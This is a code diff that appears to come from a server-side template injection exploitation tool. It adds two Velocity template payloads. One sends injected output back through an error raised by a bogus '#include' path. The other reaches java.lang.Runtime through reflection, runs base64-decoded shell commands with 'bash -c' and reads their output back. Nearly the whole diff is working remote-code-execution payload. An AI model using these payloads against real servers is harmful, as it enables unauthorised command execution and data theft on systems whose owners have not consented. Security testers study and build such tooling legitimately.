@@ -26,6 +26,14 @@ class Velocity(java.Java):
                 'test_render': f'#set($c={rand.randints[0]}*{rand.randints[1]})\n${{c}}\n',
                 'test_render_expected': f'{rand.randints[0]*rand.randints[1]}'
             },
+            'render_error': {
+                'render': '{code}',
+                'header': '\n#set($h={header[0]}+{header[1]})\n',
+                # Body needs to set b as the output
+                'trailer': '\n#set($t={trailer[0]}+{trailer[1]})\n#set($r=("Y:/A:/"+$h+$b+$t))\n#include($r)\n',
+                'test_render': f'#set($b={rand.randints[0]}*{rand.randints[1]})\n',
+                'test_render_expected': f'{rand.randints[0]*rand.randints[1]}'
+            },
             'write': {
                 'call': 'inject',
                 'write': """#set($engine="")
@@ -75,6 +83,22 @@ ${{output}}
 #end
 ${{output}}
 """ 
+            },
+            'execute_error': {
+                'call': 'render',
+                'execute': """#set($engine="")
+#set($run=$engine.getClass().forName("java.lang.Runtime"))
+#set($runtime=$run.getRuntime())
+#set($proc=$runtime.exec("bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}"))
+#set($null=$proc.waitFor())
+#set($istr=$proc.getInputStream())
+#set($chr=$engine.getClass().forName("java.lang.Character"))
+#set($b="")
+#set($string=$engine.getClass().forName("java.lang.String"))
+#foreach($i in [1..$istr.available()])
+#set($b=$b.concat($string.valueOf($chr.toChars($istr.read()))))
+#end
+"""
             },
             'execute_blind': {
                 'call': 'inject',
